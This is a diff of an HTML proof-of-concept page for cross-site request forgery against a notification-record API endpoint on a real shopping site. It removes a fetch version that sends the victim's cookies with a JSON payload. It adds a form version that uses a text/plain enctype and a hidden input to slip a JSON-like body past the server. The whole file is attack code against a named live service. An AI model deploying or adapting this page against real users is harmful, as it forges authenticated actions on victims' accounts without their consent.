@@ -1,38 +1,17 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>CSRF PoC - Temu Notifications Record</title>
+  <title>Manual CSRF PoC</title>
 </head>
 <body>
-  <h2>CSRF PoC - Record Notification</h2>
-  <button onclick="sendCSRF()">Submit CSRF Request</button>
-  <div id="result" style="margin-top: 20px; color: red;"></div>
+  <h2>Manual CSRF PoC - Submit JSON-like payload</h2>
 
-  <script>
-    function sendCSRF() {
-      const payload = {
-        id: 2,
-        type: 3,
-        status: 0
-      };
+  <form action="https://www.temu.com/api/bg/lome/user/notifications/record" method="POST" enctype="text/plain">
+    <input type="hidden" name='{"id"' value='2,"type":3,"status":0}'>
+    <input type="submit" value="Submit CSRF Request">
+  </form>
 
-      fetch("https://www.temu.com/api/bg/lome/user/notifications/record", {
-        method: "POST",
-        credentials: "include", // critical for sending cookies
-        headers: {
-          "Content-Type": "application/json;charset=UTF-8"
-        },
-        body: JSON.stringify(payload)
-      })
-      .then(response => response.text().then(text => {
-        document.getElementById("result").innerText = 
-          response.ok ? "✅ CSRF request sent successfully." : `❌ Request failed: ${text}`;
-      }))
-      .catch(err => {
-        document.getElementById("result").innerText = "⚠️ Error: " + err;
-      });
-    }
-  </script>
+  <p>⚠️ This method uses `enctype="text/plain"` and is unlikely to work if the server strictly expects `application/json` with a raw JSON body.</p>
 </body>
 </html>
